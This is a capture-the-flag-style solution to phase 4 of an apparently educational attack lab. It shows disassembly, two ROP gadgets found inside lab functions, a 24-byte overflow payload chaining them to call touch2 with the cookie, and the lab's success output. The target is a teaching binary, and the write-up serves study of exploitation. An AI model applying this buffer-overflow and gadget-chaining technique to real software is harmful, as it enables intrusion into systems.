```c
objdump -d rtarget
```
```c
0000000000401808 <touch2>:
  401808:	48 83 ec 08          	sub    $0x8,%rsp
  40180c:	89 fe                	mov    %edi,%esi
  40180e:	c7 05 e4 2c 20 00 02 	movl   $0x2,0x202ce4(%rip)        # 6044fc <vlevel>
  401815:	00 00 00 
  401818:	3b 3d e6 2c 20 00    	cmp    0x202ce6(%rip),%edi        # 604504 <cookie>
  40181e:	75 1b                	jne    40183b <touch2+0x33>
  401820:	bf 68 2f 40 00       	mov    $0x402f68,%edi
  401825:	b8 00 00 00 00       	mov    $0x0,%eax
  40182a:	e8 51 f4 ff ff       	callq  400c80 <printf@plt>
  40182f:	bf 02 00 00 00       	mov    $0x2,%edi
  401834:	e8 c0 03 00 00       	callq  401bf9 <validate>
  401839:	eb 19                	jmp    401854 <touch2+0x4c>
  40183b:	bf 90 2f 40 00       	mov    $0x402f90,%edi
  401840:	b8 00 00 00 00       	mov    $0x0,%eax
  401845:	e8 36 f4 ff ff       	callq  400c80 <printf@plt>
  40184a:	bf 02 00 00 00       	mov    $0x2,%edi
  40184f:	e8 57 04 00 00       	callq  401cab <fail>
  401854:	bf 00 00 00 00       	mov    $0x0,%edi
  401859:	e8 92 f5 ff ff       	callq  400df0 <exit@plt>
  
  00000000004017c6 <getbuf>:
  4017c6:	48 83 ec 18          	sub    $0x18,%rsp <= 0x18 is 24 Bytes
  4017ca:	48 89 e7             	mov    %rsp,%rdi
  4017cd:	e8 38 02 00 00       	callq  401a0a <Gets>
  4017d2:	b8 01 00 00 00       	mov    $0x1,%eax
  4017d7:	48 83 c4 18          	add    $0x18,%rsp
  4017db:	c3                   	retq   
  ```
  ```c
  emacs phase4.s
  ```
  
  ```c
  mov %rax, %rdi
  ret
  ```
  ```c
  gcc -c phase4.s
  ```
  ```c
  objdump -d phase4.o > phase4.d
  ```
  ```c
  emacs phase4.d
  ```
  ```c
  0000000000000000 <.text>:
   0:   48 89 c7                mov    %rax,%rdi
   3:   c3                      retq
  ```
  Save the file with <kbd>CTRL</kbd>+<kbd>x</kbd> then <kbd>CTRL</kbd>+<kbd>c</kbd> then <kbd>y</kbd>


Gadget 1
  ```c
0000000000401970 <setval_352>:
  401970:	c7 07 e6 58 90 c3    	movl   $0xc39058e6,(%rdi)
  401976:	c3                   	retq  
  ```
Address + bytes to get 58 in front = gadget1
401970 + 3 = 401973

Gadget 2
```c
0000000000401984 <getval_322>:
  401984:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  401989:	c3                   	retq   
```
Address + bytes to get 48 89 c7 in front = gadget2
401984 + 1 = 401985

cookie = 48 c7 c7 9f 5f 19 19 c3

```c
emacs phase4.txt
```

```c
00 00 00 00 00 00 00 00 /* padding */
00 00 00 00 00 00 00 00 /* padding */
00 00 00 00 00 00 00 00 /* padding */
73 19 40 00 00 00 00 00 /* gadget 1 */
9f 5f 19 19 c3 00 00 00 /* Cookie with first 3 bytes removed */
85 19 40 00 00 00 00 00 /* gadget 2 */
08 18 40 00 00 00 00 00 /* touch2 address */
```
Save the file with <kbd>CTRL</kbd>+<kbd>x</kbd> then <kbd>CTRL</kbd>+<kbd>c</kbd> then <kbd>y</kbd>
```c
./hex2raw < phase4.txt > raw-phase4.txt
```
Just to see what hex2raw does to the bytes in phase4.txt we run
```c
emacs raw-phase4.txt
```
```c
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@s^Y@^@^@^@^@^@\237_^Y^Y\
\303^@^@^@\205^Y@^@^@^@^@^@^H^X@^@^@^@^@^@
```
Save the file with <kbd>CTRL</kbd>+<kbd>x</kbd> then <kbd>CTRL</kbd>+<kbd>c</kbd> then <kbd>y</kbd>
```c
./rtarget < raw-phase4.txt
```

```c
Cookie: 0x19195f9f
Type string:Touch2!: You called touch2(0x19195f9f)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```